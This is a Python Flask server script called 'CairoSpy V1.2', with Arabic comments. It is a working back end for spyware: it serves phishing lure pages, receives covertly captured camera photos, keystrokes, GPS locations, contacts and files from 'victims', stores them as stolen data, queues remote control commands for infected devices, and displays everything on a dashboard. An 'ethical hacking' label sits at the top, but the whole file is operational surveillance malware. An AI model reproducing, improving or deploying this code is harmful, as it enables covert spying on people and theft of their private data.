#!/usr/bin/env python3
"""
CairoSpy V1.2 - No WebSocket (HTTP-only for Render Free)
Ethical Hacking Tool - Authorized Use Only
"""

import os
import json
import base64
import threading
import time
import socket
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'cairopy_sec_2024')

# مجلد التخزين
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")
for folder in ['camera', 'keys', 'location', 'contacts', 'files']:
    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)

VICTIM_IP = "Unknown"
CONTROL_QUEUE = []  # قائمة انتظار لأوامر التحكم

# ========== صفحات الهجوم ==========
@app.route('/')
def index_attack():
    return render_template('index.html')

@app.route('/image')
def image_attack():
    return render_template('image.html')

@app.route('/qr')
def qr_attack():
    return render_template('qr.html')

# ========== API لجمع البيانات ==========
@app.route('/api/camera', methods=['POST'])
def receive_camera():
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    photo_type = data.get('type', 'front')
    image_data = data.get('image', '')
    
    if image_data:
        filename = f"{victim_id}_{photo_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        filepath = os.path.join(STOLEN_DIR, 'camera', filename)
        
        image_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        
        print(f"[📸] صورة {photo_type} مستلمة: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "message": "No image data"}), 400

@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    global VICTIM_IP
    VICTIM_IP = request.remote_addr
    
    log_entry = {
        'ip': VICTIM_IP,
        'timestamp': datetime.now().isoformat(),
        'keys': data.get('keys', ''),
        'url': data.get('url', '')
    }
    
    filename = f"keylog_{VICTIM_IP.replace('.','_')}_{datetime.now().strftime('%Y%m%d')}.txt"
    filepath = os.path.join(STOLEN_DIR, 'keys', filename)
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    print(f"[⌨️] Keys from {VICTIM_IP}: {data.get('keys', '')[:50]}...")
    return jsonify({"status": "ok"})

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.json
    ip = request.remote_addr
    
    loc_entry = {
        'ip': ip,
        'timestamp': datetime.now().isoformat(),
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'accuracy': data.get('accuracy'),
        'maps_link': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
    }
    
    filename = f"location_{ip.replace('.','_')}.json"
    filepath = os.path.join(STOLEN_DIR, 'location', filename)
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(loc_entry) + '\n')
    
    print(f"[📍] Location: {data.get('lat')}, {data.get('lon')}")
    print(f"[📍] Maps: {loc_entry['maps_link']}")
    return jsonify({"status": "ok"})

@app.route('/api/contacts', methods=['POST'])
def receive_contacts():
    data = request.json
    ip = request.remote_addr
    
    contacts = data.get('contacts', [])
    filename = f"contacts_{ip.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join(STOLEN_DIR, 'contacts', filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(contacts, f, indent=2, ensure_ascii=False)
    
    print(f"[👤] Contacts received: {len(contacts)} entries")
    return jsonify({"status": "ok"})

@app.route('/api/files', methods=['POST'])
def receive_files():
    data = request.json
    ip = request.remote_addr
    
    file_data = data.get('file', '')
    filename = data.get('filename', f'unknown_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
    
    if file_data:
        file_bytes = base64.b64decode(file_data.split(',')[1] if ',' in file_data else file_data)
        filepath = os.path.join(STOLEN_DIR, 'files', filename)
        with open(filepath, 'wb') as f:
            f.write(file_bytes)
        print(f"[📁] File received: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== أوامر التحكم (HTTP-based بدل WebSocket) ==========
@app.route('/api/control', methods=['POST'])
def control_victim():
    """استلام أمر تحكم ووضعه في قائمة الانتظار"""
    data = request.json
    action = data.get('action')
    
    global CONTROL_QUEUE
    CONTROL_QUEUE.append({
        'action': action,
        'data': data,
        'timestamp': datetime.now().isoformat()
    })
    
    print(f"[🎮] Control command queued: {action}")
    return jsonify({"status": f"queued_{action}"})

@app.route('/api/poll', methods=['GET'])
def poll_controls():
    """الضحية يستعلم عن أوامر التحكم (Polling)"""
    global CONTROL_QUEUE
    if CONTROL_QUEUE:
        cmd = CONTROL_QUEUE.pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

# ========== عرض البيانات المسروقة ==========
@app.route('/dashboard')
def dashboard():
    files = {}
    for cat in ['camera', 'keys', 'location', 'contacts', 'files']:
        try:
            files[cat] = os.listdir(os.path.join(STOLEN_DIR, cat))
        except:
            files[cat] = []
    
    return render_template('dashboard.html', files=files, victim_ip=VICTIM_IP)

@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    safe_categories = ['camera', 'keys', 'location', 'contacts', 'files']
    if category not in safe_categories:
        return "Invalid category", 400
    return send_file(os.path.join(STOLEN_DIR, category, filename))

# ========== نقطة التحقق الصحية ==========
@app.route('/health')
def health_check():
    return jsonify({"status": "alive", "timestamp": datetime.now().isoformat()})

# ========== تشغيل السيرفر ==========
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║    CairoSpy V1.2 - HTTP-only Ready   ║
║    Optimized for Render Free         ║
╚══════════════════════════════════════╝
    """)
    
    port = int(os.environ.get('PORT', 5000))
    host = '0.0.0.0'
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"[+] Local: http://{local_ip}:{port}")
    except:
        print(f"[+] Running on port {port}")
    
    print(f"[+] Pages: / (link), /image, /qr")
    print(f"[+] Dashboard: /dashboard")
    print(f"[+] Health check: /health")
    print("="*50)
    
    # استخدام waitress للإنتاج
    if os.environ.get('RENDER') or os.environ.get('RAILWAY') or os.environ.get('PRODUCTION'):
        print("[+] Production mode: using waitress")
        from waitress import serve
        serve(app, host=host, port=port)
    else:
        print("[+] Development mode: using Flask built-in")
        app.run(host=host, port=port, debug=True)
